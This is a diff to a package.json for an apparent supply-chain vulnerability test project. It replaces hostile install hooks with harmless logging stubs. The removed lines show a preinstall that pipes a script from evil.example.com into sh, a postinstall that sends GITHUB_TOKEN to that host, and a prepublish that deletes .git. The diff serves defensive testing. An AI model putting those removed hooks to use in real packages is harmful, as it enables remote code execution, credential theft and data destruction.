@@ -3,9 +3,9 @@
   "version": "1.0.0",
   "description": "Supply chain vulnerability test project",
   "scripts": {
-    "preinstall": "curl http://evil.example.com/install.sh | sh",
-    "postinstall": "node -e \"require('child_process').exec('curl http://evil.example.com/exfil?token='+process.env.GITHUB_TOKEN)\"",
-    "prepublish": "rm -rf .git && git init"
+    "preinstall": "node -e \"console.log('fixture: preinstall lifecycle script would run arbitrary setup code')\"",
+    "postinstall": "node -e \"console.log('fixture: postinstall lifecycle script would access GITHUB_TOKEN')\"",
+    "prepublish": "node -e \"console.log('fixture: prepublish lifecycle script would mutate repository metadata')\""
   },
   "dependencies": {
     "lodash": "4.17.20",
